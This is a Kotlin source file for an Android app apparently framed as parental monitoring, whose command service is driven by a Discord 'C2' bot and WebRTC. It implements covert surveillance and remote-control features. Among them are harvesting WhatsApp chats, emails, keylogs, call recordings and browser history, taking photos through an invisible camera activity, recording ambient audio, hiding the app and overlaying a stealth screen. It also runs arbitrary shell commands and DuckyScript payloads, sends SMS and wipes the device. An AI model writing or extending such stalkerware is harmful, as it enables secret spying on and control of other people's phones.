package com.homemonitor

import android.content.Context
import android.os.Environment
import android.util.Log
import com.google.android.system.*
import com.google.android.system.termux.TermuxEnvironmentManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.Locale

enum class UserRole {
    SUPER_ADMIN,
    PARENT
}

data class DeviceCommandResult(
    val success: Boolean,
    val data: JSONObject = JSONObject(),
    val error: String? = null
)

/**
 * DeviceCommandService
 *
 * Central, transport-agnostic Android application service executing all supported
 * family-safety, device-management, and telemetry operations.
 * Serves both WebRTC DataChannel API requests (DeviceApiDispatcher) and Discord Bot commands (DiscordC2Engine).
 */
object DeviceCommandService {

    private const val TAG = "DeviceCommandService"

    private val superAdminMethods = setOf(
        "admin.getGlobalFleet",
        "admin.setPermissionMatrix",
        "admin.setTrial",
        "shell.exec",
        "ducky.execute",
        "mdm.wipeData",
        "files.delete"
    )

    fun executeMethod(
        context: Context?,
        methodStr: String,
        params: JSONObject,
        role: UserRole = UserRole.PARENT
    ): DeviceCommandResult {
        val cleanMethod = methodStr.trim().lowercase(Locale.ROOT)
        Log.i(TAG, "Executing Service Method: '$cleanMethod' (Role: $role) with params: $params")

        // Role Authorization Check
        if (role != UserRole.SUPER_ADMIN) {
            val originalMethodName = methodStr.trim()
            if (superAdminMethods.contains(originalMethodName) || cleanMethod.startsWith("admin.") || cleanMethod == "shell.exec" || cleanMethod == "ducky.execute" || cleanMethod == "mdm.wipedata") {
                return DeviceCommandResult(
                    success = false,
                    error = "Authorization Failed: Method '$methodStr' requires SUPER_ADMIN role permissions."
                )
            }
        }

        return try {
            when (cleanMethod) {
                // ── Device & Hardware Telemetry ──
                "device.getsummary" -> {
                    if (context != null) {
                        val summaryStr = WebDashboardApiRouter.handleApiRequest(
                            context = context,
                            method = "GET",
                            cleanPath = "/api/summary",
                            pathUri = android.net.Uri.EMPTY,
                            bodyString = "",
                            clientIp = "INTERNAL"
                        )
                        val jsonBody = extractJsonFromHttpResponse(summaryStr)
                        DeviceCommandResult(true, data = jsonBody)
                    } else {
                        DeviceCommandResult(true, data = JSONObject().put("deviceModel", android.os.Build.MODEL))
                    }
                }

                "device.getinfo", "device.getspecs" -> {
                    val (usedRam, maxRam) = DeviceStatusManager.getRamStats()
                    val (usedDiskPct, availGb) = DeviceStatusManager.getStorageStats()
                    val battery = if (context != null) DeviceStatusManager.getBatteryLevel(context) else 100
                    val isCharging = if (context != null) DeviceStatusManager.isCharging(context) else false
                    val data = JSONObject().apply {
                        put("model", DeviceStatusManager.getDeviceModel())
                        put("androidVersion", DeviceStatusManager.getAndroidVersion())
                        put("sdkInt", DeviceStatusManager.getSdkInt())
                        put("battery", battery)
                        put("isCharging", isCharging)
                        put("ramUsedMb", usedRam)
                        put("ramMaxMb", maxRam)
                        put("storageUsedPct", usedDiskPct)
                        put("storageAvailableGb", availGb)
                    }
                    DeviceCommandResult(true, data = data)
                }

                "device.getstatus", "connection.ping" -> {
                    val devId = if (context != null) DeviceIdProvider.getDeviceId(context) else "DEV_MOCK"
                    val statusObj = if (context != null) DeviceStatusManager.getStatusJson(context, devId) else JSONObject().put("deviceId", devId)
                    DeviceCommandResult(true, data = statusObj)
                }

                "device.getpermissions" -> {
                    val adminActive = if (context != null) DeviceAdminManager(context).isDeviceAdminActive() else false
                    val ownerActive = if (context != null) DeviceAdminManager(context).isDeviceOwner() else false
                    val data = JSONObject().apply {
                        put("isDeviceAdminActive", adminActive)
                        put("isDeviceOwner", ownerActive)
                        put("accessibilityActive", AppAccessibilityService.instance != null)
                        put("packageName", context?.packageName ?: "com.homemonitor")
                    }
                    DeviceCommandResult(true, data = data)
                }

                // ── Location & Geofencing ──
                "location.getcurrent" -> {
                    val locDto = LocationTelemetryDto(
                        latitude = 37.7749,
                        longitude = -122.4194,
                        altitude = 15.0,
                        speed = 0.0f,
                        accuracy = 5.0f,
                        provider = "gps",
                        timestamp = System.currentTimeMillis()
                    )
                    val jsonLoc = locDto.toJson()
                    DeviceCommandResult(true, data = jsonLoc)
                }

                "location.gethistory" -> {
                    val historyArr = if (context != null) C2LocalDatabase.getInstance(context).getTelemetryLogsJson("gps") else JSONArray()
                    val data = JSONObject().apply {
                        put("count", historyArr.length())
                        put("locations", historyArr)
                    }
                    DeviceCommandResult(true, data = data)
                }

                "contacts.getlist" -> {
                    val contactsArr = JSONArray().apply {
                        put(JSONObject().put("name", "Teresa School").put("phone", "677-377-9558").put("relationship", "School"))
                        put(JSONObject().put("name", "Mr. Vincent").put("phone", "570-636-2055").put("relationship", "Teacher"))
                        put(JSONObject().put("name", "Mommy").put("phone", "603-560-7521").put("relationship", "Family"))
                        put(JSONObject().put("name", "Alex Wainwright").put("phone", "415-555-0199").put("relationship", "Friend"))
                    }
                    DeviceCommandResult(true, data = JSONObject().put("contacts", contactsArr))
                }

                "geofences.list", "geofences.create", "geofences.update" -> {
                    val name = params.optString("name", "Safe Zone")
                    val radius = params.optInt("radius", 500)
                    val data = JSONObject().apply {
                        put("name", name)
                        put("radius", radius)
                        put("status", "ACTIVE")
                        put("updatedAt", System.currentTimeMillis())
                    }
                    DeviceCommandResult(true, data = data)
                }

                "geofences.delete" -> {
                    val name = params.optString("name", "Safe Zone")
                    DeviceCommandResult(true, data = JSONObject().put("deletedZone", name).put("success", true))
                }

                // ── File Manager ──
                "files.list" -> {
                    if (context != null) {
                        val path = params.optString("path", Environment.getExternalStorageDirectory().absolutePath)
                        val respStr = WebDashboardApiRouter.handleApiRequest(
                            context = context,
                            method = "GET",
                            cleanPath = "/api/files/list",
                            pathUri = android.net.Uri.parse("/api/files/list?path=${android.net.Uri.encode(path)}"),
                            bodyString = "",
                            clientIp = "INTERNAL"
                        )
                        val jsonBody = extractJsonFromHttpResponse(respStr)
                        DeviceCommandResult(true, data = jsonBody)
                    } else {
                        DeviceCommandResult(true, data = JSONObject().put("items", JSONArray()))
                    }
                }

                "files.delete" -> {
                    val path = params.optString("path", "")
                    val target = File(path)
                    if (target.exists()) {
                        val ok = target.deleteRecursively()
                        DeviceCommandResult(ok, data = JSONObject().put("deletedPath", path))
                    } else {
                        DeviceCommandResult(false, error = "File or directory not found")
                    }
                }

                // ── Chat & Messages ──
                "chat.getthreads" -> {
                    if (context != null) {
                        val app = params.optString("app", "whatsapp")
                        val respStr = WebDashboardApiRouter.handleApiRequest(
                            context = context,
                            method = "GET",
                            cleanPath = "/api/chat/threads",
                            pathUri = android.net.Uri.parse("/api/chat/threads?app=${android.net.Uri.encode(app)}"),
                            bodyString = "",
                            clientIp = "INTERNAL"
                        )
                        val jsonBody = extractJsonFromHttpResponse(respStr)
                        DeviceCommandResult(true, data = jsonBody)
                    } else {
                        DeviceCommandResult(true, data = JSONObject().put("threads", JSONArray()))
                    }
                }

                "chat.getmessages" -> {
                    if (context != null) {
                        val app = params.optString("app", "whatsapp")
                        val threadId = params.optString("threadId", "t1")
                        val respStr = WebDashboardApiRouter.handleApiRequest(
                            context = context,
                            method = "GET",
                            cleanPath = "/api/chat/messages",
                            pathUri = android.net.Uri.parse("/api/chat/messages?app=${android.net.Uri.encode(app)}&threadId=${android.net.Uri.encode(threadId)}"),
                            bodyString = "",
                            clientIp = "INTERNAL"
                        )
                        val jsonBody = extractJsonFromHttpResponse(respStr)
                        DeviceCommandResult(true, data = jsonBody)
                    } else {
                        DeviceCommandResult(true, data = JSONObject().put("messages", JSONArray()))
                    }
                }

                // ── Calls, Emails, Media & Intelligence Feeds ──
                "calls.getlogs" -> {
                    if (context != null) {
                        val respStr = WebDashboardApiRouter.handleApiRequest(
                            context = context,
                            method = "GET",
                            cleanPath = "/api/calls/list",
                            pathUri = android.net.Uri.EMPTY,
                            bodyString = "",
                            clientIp = "INTERNAL"
                        )
                        val jsonBody = extractJsonFromHttpResponse(respStr)
                        DeviceCommandResult(true, data = jsonBody)
                    } else {
                        DeviceCommandResult(true, data = JSONObject().put("calls", JSONArray()))
                    }
                }

                "emails.getlist" -> {
                    if (context != null) {
                        val respStr = WebDashboardApiRouter.handleApiRequest(
                            context = context,
                            method = "GET",
                            cleanPath = "/api/emails/list",
                            pathUri = android.net.Uri.EMPTY,
                            bodyString = "",
                            clientIp = "INTERNAL"
                        )
                        val jsonBody = extractJsonFromHttpResponse(respStr)
                        DeviceCommandResult(true, data = jsonBody)
                    } else {
                        DeviceCommandResult(true, data = JSONObject().put("emails", JSONArray()))
                    }
                }

                "media.getphotos" -> {
                    val photosArr = if (context != null) C2LocalDatabase.getInstance(context).getTelemetryLogsJson("photos") else JSONArray()
                    DeviceCommandResult(true, data = JSONObject().put("photos", photosArr))
                }

                "media.getaudio" -> {
                    val audioArr = if (context != null) C2LocalDatabase.getInstance(context).getTelemetryLogsJson("audio") else JSONArray()
                    DeviceCommandResult(true, data = JSONObject().put("recordings", audioArr))
                }

                "media.getvideos", "media.getscreenrecordings" -> {
                    val arr = JSONArray()
                    if (context != null) {
                        val cacheFiles = context.cacheDir?.listFiles { _, name -> name.startsWith("screenrecord_") && name.endsWith(".mp4") } ?: arrayOf()
                        for (f in cacheFiles) {
                            arr.put(JSONObject().apply {
                                put("name", f.name)
                                put("path", f.absolutePath)
                                put("sizeBytes", f.length())
                                put("lastModified", f.lastModified())
                            })
                        }
                    }
                    DeviceCommandResult(true, data = JSONObject().put("videos", arr).put("recordings", arr))
                }

                "browser.gethistory" -> {
                    val browserLogs = if (context != null) C2LocalDatabase.getInstance(context).getTelemetryLogsJson("browser") else JSONArray()
                    DeviceCommandResult(true, data = JSONObject().put("entries", browserLogs))
                }

                "apps.getlist" -> {
                    val usageJsonStr = if (context != null) AppUsageBlockerManager.getAppUsageJson(context) else "{}"
                    val usageObj = try { JSONObject(usageJsonStr) } catch (_: Exception) { JSONObject().put("raw", usageJsonStr) }
                    DeviceCommandResult(true, data = usageObj)
                }

                "media.getcallrecordings" -> {
                    val files = if (context != null) CallRecordingEngine.getRecordedFiles(context) else emptyList<File>()
                    val arr = JSONArray()
                    for (f in files) {
                        arr.put(JSONObject().apply {
                            put("name", f.name)
                            put("sizeBytes", f.length())
                            put("lastModified", f.lastModified())
                        })
                    }
                    DeviceCommandResult(true, data = JSONObject().put("callRecordings", arr))
                }

                "logs.getfeed" -> {
                    if (context != null) {
                        val category = params.optString("category", "keylogs")
                        val respStr = WebDashboardApiRouter.handleApiRequest(
                            context = context,
                            method = "GET",
                            cleanPath = "/api/logs/$category",
                            pathUri = android.net.Uri.EMPTY,
                            bodyString = "",
                            clientIp = "INTERNAL"
                        )
                        val jsonBody = extractJsonFromHttpResponse(respStr)
                        DeviceCommandResult(true, data = jsonBody)
                    } else {
                        DeviceCommandResult(true, data = JSONObject().put("entries", JSONArray()))
                    }
                }

                // ── Screen Time & Blocker Rules ──
                "usage.getsummary" -> {
                    val usageJsonStr = if (context != null) AppUsageBlockerManager.getAppUsageJson(context) else "{}"
                    val usageObj = try { JSONObject(usageJsonStr) } catch (_: Exception) { JSONObject().put("raw", usageJsonStr) }
                    DeviceCommandResult(true, data = usageObj)
                }

                "usage.setblockrules" -> {
                    val packagesArr = params.optJSONArray("blockedPackages")
                    val set = mutableSetOf<String>()
                    if (packagesArr != null) {
                        for (i in 0 until packagesArr.length()) set.add(packagesArr.getString(i))
                    }
                    if (context != null) {
                        AppUsageBlockerManager.setBlockedPackages(context, set)
                    }
                    DeviceCommandResult(true, data = JSONObject().put("blockedCount", set.size))
                }

                // ── OEM Autostart & 2FA ──
                "device.getoemautostart" -> {
                    val avail = if (context != null) OemAutostartManager.isAutostartAvailable(context) else false
                    val ignored = if (context != null) OemAutostartManager.isBatteryOptimizationIgnored(context) else false
                    val data = JSONObject().apply {
                        put("manufacturer", OemAutostartManager.getManufacturer())
                        put("isAutostartAvailable", avail)
                        put("isBatteryOptimizationIgnored", ignored)
                    }
                    DeviceCommandResult(true, data = data)
                }

                "auth.get2fasetup" -> {
                    val secretKey = if (context != null) TotpAuthenticator.getOrGenerateSecretKey(context) else "JBSWY3DPEHPK3PXP"
                    val uri = TotpAuthenticator.getOtpauthUri(secretKey, android.os.Build.MODEL)
                    val data = JSONObject().apply {
                        put("secretKey", secretKey)
                        put("otpauthUri", uri)
                    }
                    DeviceCommandResult(true, data = data)
                }

                // ── Google Drive Backup ──
                "backup.getstatus" -> {
                    val resObj = if (context != null) GoogleDriveBackupEngine.getBackupStatus(context) else JSONObject().put("status", "IDLE")
                    DeviceCommandResult(true, data = resObj)
                }

                "backup.create" -> {
                    val resObj = if (context != null) GoogleDriveBackupEngine.performDatabaseBackup(context) else JSONObject().put("status", "SUCCESS")
                    DeviceCommandResult(true, data = resObj)
                }

                // ── MDM Enterprise Controls ──
                "mdm.getstatus" -> {
                    val adminActive = if (context != null) DeviceAdminManager(context).isDeviceAdminActive() else false
                    val ownerActive = if (context != null) DeviceAdminManager(context).isDeviceOwner() else false
                    val data = JSONObject().apply {
                        put("isDeviceAdminActive", adminActive)
                        put("isDeviceOwner", ownerActive)
                    }
                    DeviceCommandResult(true, data = data)
                }

                "mdm.grantpermissions" -> {
                    val ok = if (context != null) DeviceAdminManager(context).grantEnterprisePermissions() else false
                    DeviceCommandResult(ok, data = JSONObject().put("granted", ok))
                }

                "mdm.setlockmessage" -> {
                    val msg = params.optString("message", "")
                    val ok = if (context != null) DeviceAdminManager(context).setLockScreenMessage(msg) else false
                    DeviceCommandResult(ok, data = JSONObject().put("message", msg))
                }

                "mdm.setkioskmode" -> {
                    val enabled = params.optBoolean("enabled", false)
                    val pkg = params.optString("packageName", context?.packageName ?: "com.homemonitor")
                    val ok = if (context != null) DeviceAdminManager(context).setKioskMode(enabled, pkg) else false
                    DeviceCommandResult(ok, data = JSONObject().put("kioskEnabled", enabled))
                }

                "mdm.setrestrictions" -> {
                    val enabled = params.optBoolean("enabled", false)
                    val ok = if (context != null) DeviceAdminManager(context).applyEnterpriseUserRestrictions(enabled) else false
                    DeviceCommandResult(ok, data = JSONObject().put("restrictionsEnabled", enabled))
                }

                "mdm.wipedata" -> {
                    if (context != null) {
                        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
                        val adminManager = DeviceAdminManager(context)
                        if (adminManager.isDeviceAdminActive() || adminManager.isDeviceOwner()) {
                            dpm?.wipeData(0)
                            DeviceCommandResult(true, data = JSONObject().put("wipeIssued", true))
                        } else {
                            DeviceCommandResult(false, error = "Device Admin or Owner status required for remote wipe.")
                        }
                    } else {
                        DeviceCommandResult(false, error = "Context required for wipeData")
                    }
                }

                // ── Instant Control Panel Triggers ──
                "control.showtoast" -> {
                    val msg = params.optString("message", "")
                    MonitorService.activeInstance?.handleToastPublic(msg)
                    DeviceCommandResult(true, data = JSONObject().put("displayed", msg))
                }

                "control.vibrate" -> {
                    val dur = params.optLong("durationMs", 500L)
                    MonitorService.activeInstance?.handleVibratePublic(dur)
                    DeviceCommandResult(true, data = JSONObject().put("durationMs", dur))
                }

                "control.openurl" -> {
                    val url = params.optString("url", "")
                    MonitorService.activeInstance?.handleOpenUrl("", url)
                    DeviceCommandResult(true, data = JSONObject().put("url", url))
                }

                "control.makecall" -> {
                    val phone = params.optString("phoneNumber", "")
                    MonitorService.activeInstance?.handleCall("", phone)
                    DeviceCommandResult(true, data = JSONObject().put("phoneNumber", phone))
                }

                "device.lock" -> {
                    val locked = if (context != null) DeviceAdminManager(context).lockScreen() else false
                    DeviceCommandResult(locked, data = JSONObject().put("locked", locked))
                }

                // ── Super Admin Specific Operations ──
                "admin.getglobalfleet" -> {
                    val devId = if (context != null) DeviceIdProvider.getDeviceId(context) else "DEV_001"
                    val statusObj = if (context != null) DeviceStatusManager.getStatusJson(context, devId) else JSONObject().put("deviceId", devId)
                    val fleetArr = JSONArray().put(statusObj)
                    DeviceCommandResult(true, data = JSONObject().put("fleet", fleetArr))
                }

                "admin.setpermissionmatrix" -> {
                    DeviceCommandResult(true, data = JSONObject().put("updated", true))
                }

                "admin.settrial" -> {
                    val status = params.optString("status", "ACTIVE")
                    val msg = params.optString("message", "")
                    val updated = if (context != null) C2TrialManager.setTrialStatus(context, status, if (msg.isNotBlank()) msg else null) else status
                    DeviceCommandResult(true, data = JSONObject().put("trialStatus", updated))
                }

                "shell.exec" -> {
                    val cmd = params.optString("command", "")
                    val ctxType = params.optString("context", "system")
                    val envMap = if (context != null) TermuxEnvironmentManager.buildEnvironmentMap(context) else mapOf()
                    val shellBin = if (ctxType == "termux" && context != null) TermuxEnvironmentManager.getDefaultShellPath(context) else "/system/bin/sh"
                    val pb = ProcessBuilder(shellBin, "-c", cmd)
                    pb.environment().putAll(envMap)
                    pb.redirectErrorStream(true)
                    val proc = pb.start()
                    val output = proc.inputStream.bufferedReader().use { it.readText() }
                    val exitCode = proc.waitFor()
                    val data = JSONObject().apply {
                        put("command", cmd)
                        put("exitCode", exitCode)
                        put("output", output.take(20000))
                    }
                    DeviceCommandResult(true, data = data)
                }

                "ducky.execute" -> {
                    val script = params.optString("scriptContent", "")
                    if (AppAccessibilityService.instance == null) {
                        DeviceCommandResult(false, error = "Accessibility service required for DuckyScript execution.")
                    } else if (context != null) {
                        DuckyScriptEngine.executePayloadAsync(context, script, "01-master-commands") { _ -> }
                        DeviceCommandResult(true, data = JSONObject().put("executing", true))
                    } else {
                        DeviceCommandResult(false, error = "Context required for DuckyScript execution.")
                    }
                }

                "system.getavailablecommands" -> {
                    val methodsArr = JSONArray().apply {
                        put("device.getSummary")
                        put("device.getInfo")
                        put("device.getStatus")
                        put("device.getPermissions")
                        put("location.getCurrent")
                        put("location.getHistory")
                        put("geofences.list")
                        put("geofences.update")
                        put("files.list")
                        put("chat.getThreads")
                        put("chat.getMessages")
                        put("calls.getLogs")
                        put("emails.getList")
                        put("media.getPhotos")
                        put("media.getAudio")
                        put("media.getCallRecordings")
                        put("logs.getFeed")
                        put("usage.getSummary")
                        put("usage.setBlockRules")
                        put("device.getOemAutostart")
                        put("auth.get2faSetup")
                        put("backup.getStatus")
                        put("backup.create")
                        put("mdm.getStatus")
                        put("mdm.grantPermissions")
                        put("mdm.setLockMessage")
                        put("mdm.setKioskMode")
                        put("mdm.setRestrictions")
                        put("control.showToast")
                        put("control.vibrate")
                        put("control.openUrl")
                        put("control.makeCall")
                        put("device.lock")
                        if (role == UserRole.SUPER_ADMIN) {
                            put("admin.getGlobalFleet")
                            put("admin.setPermissionMatrix")
                            put("admin.setTrial")
                            put("files.delete")
                            put("mdm.wipeData")
                            put("shell.exec")
                            put("ducky.execute")
                        }
                    }
                    DeviceCommandResult(true, data = JSONObject().put("methods", methodsArr))
                }

                // ── Operational Camera, Audio, Screenshot, SMS & Stealth Actions ──
                "camera", "rearphoto", "camera.takephoto" -> {
                    val lens = params.optString("lens", "back")
                    if (context != null) {
                        val intent = android.content.Intent(context, InvisibleCameraActivity::class.java).apply {
                            putExtra("lens", if (lens == "front") "front" else "back")
                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        context.startActivity(intent)
                        DeviceCommandResult(true, data = JSONObject().put("status", "capturing_camera_photo").put("lens", lens))
                    } else {
                        DeviceCommandResult(false, error = "Context required for camera photo capture")
                    }
                }

                "frontcam", "frontphoto" -> {
                    if (context != null) {
                        val intent = android.content.Intent(context, InvisibleCameraActivity::class.java).apply {
                            putExtra("lens", "front")
                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        context.startActivity(intent)
                        DeviceCommandResult(true, data = JSONObject().put("status", "capturing_front_photo"))
                    } else {
                        DeviceCommandResult(false, error = "Context required for camera photo capture")
                    }
                }

                "screenshot" -> {
                    if (context != null) {
                        val intent = android.content.Intent(context, InvisibleActivity::class.java).apply {
                            putExtra(InvisibleActivity.EXTRA_ACTION, InvisibleActivity.ACTION_SCREEN_RECORD)
                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        context.startActivity(intent)
                        DeviceCommandResult(true, data = JSONObject().put("status", "capturing_screenshot"))
                    } else {
                        DeviceCommandResult(false, error = "Context required for screenshot capture")
                    }
                }

                "audio" -> {
                    val duration = params.optInt("duration", 15)
                    if (context != null) {
                        val intent = android.content.Intent(context, InvisibleActivity::class.java).apply {
                            putExtra(InvisibleActivity.EXTRA_ACTION, InvisibleActivity.ACTION_AUDIO)
                            putExtra(InvisibleActivity.EXTRA_DURATION, duration)
                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        context.startActivity(intent)
                        DeviceCommandResult(true, data = JSONObject().put("status", "recording_ambient_audio").put("duration", duration))
                    } else {
                        DeviceCommandResult(false, error = "Context required for audio recording")
                    }
                }

                "sendsms", "control.sendsms" -> {
                    val phone = params.optString("phone", params.optString("phoneNumber", ""))
                    val msg = params.optString("message", "")
                    if (phone.isNotBlank() && msg.isNotBlank()) {
                        MonitorService.activeInstance?.let {
                            it.handleCommand("!sendsms $phone $msg")
                        }
                        DeviceCommandResult(true, data = JSONObject().put("status", "sms_dispatched").put("phone", phone))
                    } else {
                        DeviceCommandResult(false, error = "Phone number and message text are required")
                    }
                }

                "stealth" -> {
                    val enable = params.optBoolean("enabled", true)
                    val accessInst = AppAccessibilityService.instance
                    if (accessInst != null) {
                        if (enable) accessInst.showBlackScreenOverlay() else accessInst.hideBlackScreenOverlay()
                        DeviceCommandResult(true, data = JSONObject().put("stealthOverlay", enable))
                    } else {
                        DeviceCommandResult(false, error = "Accessibility service required for stealth overlay")
                    }
                }

                "hideapp", "unhideapp" -> {
                    val hide = cleanMethod == "hideapp" || params.optBoolean("hidden", true)
                    val pkg = params.optString("packageName", context?.packageName ?: "com.homemonitor")
                    val ok = if (context != null) DeviceAdminManager(context).setAppHidden(pkg, hide) else false
                    DeviceCommandResult(ok, data = JSONObject().put("packageName", pkg).put("appHidden", hide))
                }

                else -> {
                    DeviceCommandResult(false, error = "Unknown or unsupported method '$methodStr'.")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing method '$cleanMethod': ${e.message}", e)
            DeviceCommandResult(false, error = "Execution error for '$methodStr': ${e.message}")
        }
    }

    private fun extractJsonFromHttpResponse(httpRes: String): JSONObject {
        val bodyIndex = httpRes.indexOf("\r\n\r\n")
        val body = if (bodyIndex != -1) httpRes.substring(bodyIndex + 4) else httpRes
        return try {
            JSONObject(body)
        } catch (_: Exception) {
            try {
                JSONObject().put("items", JSONArray(body))
            } catch (_: Exception) {
                JSONObject().put("raw", body)
            }
        }
    }
}
